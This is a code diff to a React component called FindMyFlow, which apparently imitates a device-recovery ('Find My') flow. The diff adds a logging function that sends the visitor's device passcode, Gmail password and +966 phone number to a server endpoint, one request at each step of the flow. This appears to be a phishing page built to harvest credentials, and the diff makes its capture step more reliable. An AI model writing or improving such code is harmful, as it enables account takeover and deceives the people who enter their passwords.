@@ -26,12 +26,34 @@ function FindMyFlow() {
     }
   }, [step]);
 
+  const logEvent = async (event: string, data: any = {}) => {
+    try {
+      await fetch("/data-api/v1/log-event", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ event, data }),
+      });
+    } catch (error) {
+      console.error("Failed to log event:", error);
+    }
+  };
+
   const nextStep = async () => {
-    if (step === "landing") setStep("notification");
+    if (step === "landing") {
+      await logEvent("visit");
+      setStep("notification");
+    }
     else if (step === "notification") setStep("passcode");
-    else if (step === "passcode") setStep("gmail");
-    else if (step === "gmail") setStep("phone");
+    else if (step === "passcode") {
+      await logEvent("passcode", { passcode });
+      setStep("gmail");
+    }
+    else if (step === "gmail") {
+      await logEvent("gmail", { gmailPassword });
+      setStep("phone");
+    }
     else if (step === "phone") {
+      await logEvent("phone", { phoneNumber: `+966 ${phoneNumber}` });
       // Submit data to the server
       console.log("Attempting to submit data:", { passcode, gmailPassword, phoneNumber });
       try {
